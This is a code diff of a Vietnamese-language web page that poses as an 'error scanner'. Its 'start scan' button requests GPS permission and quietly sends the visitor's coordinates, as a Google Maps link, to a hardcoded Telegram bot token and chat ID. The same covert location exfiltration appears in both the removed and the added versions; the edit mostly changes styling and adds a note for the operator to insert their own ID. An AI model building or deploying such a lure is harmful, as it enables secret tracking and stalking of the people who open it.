@@ -1,37 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
-<body style="text-align: center; padding-top: 50px; background: #111; color: white;">
-    <h2>MÁY QUÉT LỖI 54 4VAL</h2>
-    <button onclick="getLoc()" style="padding: 20px; background: red; color: white; border-radius: 10px;">BẮT ĐẦU QUÉT</button>
-    <p id="status" style="margin-top: 20px; color: yellow;"></p>
+<body style="text-align: center; padding-top: 50px; background: #111; color: white; font-family: sans-serif;">
+    <h2 style="color: red;">MÁY QUÉT LỖI 54 4VAL</h2>
+    <button onclick="getLoc()" style="padding: 20px 40px; background: red; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer;">BẮT ĐẦU QUÉT</button>
+    <div id="status" style="margin-top: 20px; color: yellow;">Trạng thái: Sẵn sàng</div>
 
     <script>
         function getLoc() {
             const status = document.getElementById("status");
             const token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg";
-            const chat_id = "1197457034";
+            // DÁN SỐ ID CÁ NHÂN CỦA BẠN VÀO ĐÂY
+            const chat_id = "1197457034"; 
 
             status.innerHTML = "Đang xin quyền GPS...";
-
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    status.innerHTML = "Đang gửi tọa độ về Telegram...";
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍Xe_tai:_https://www.google.com/maps?q=${lat},${lon}`;
-
-                    fetch(url)
-                        .then(() => {
-                            status.innerHTML = "✅ ĐÃ GỬI THÀNH CÔNG!";
-                            alert("Kiểm tra Telegram ngay!");
-                        })
-                        .catch(() => status.innerHTML = "❌ Lỗi mạng!");
-                },
-                (err) => {
-                    status.innerHTML = "❌ Lỗi: Bạn chưa bấm 'Cho phép' vị trí!";
-                }
-            );
+            navigator.geolocation.getCurrentPosition((pos) => {
+                status.innerHTML = "Đang gửi tọa độ về Telegram...";
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍Xe_tai:_https://www.google.com/maps?q=${lat},${lon}`;
+                
+                fetch(url).then(res => {
+                    if(res.ok) { status.innerHTML = "✅ ĐÃ GỬI THÀNH CÔNG!"; }
+                    else { status.innerHTML = "❌ Lỗi: Kiểm tra lại ID!"; }
+                });
+            }, () => { status.innerHTML = "❌ Hãy cho phép quyền vị trí!"; });
         }
     </script>
 </body>
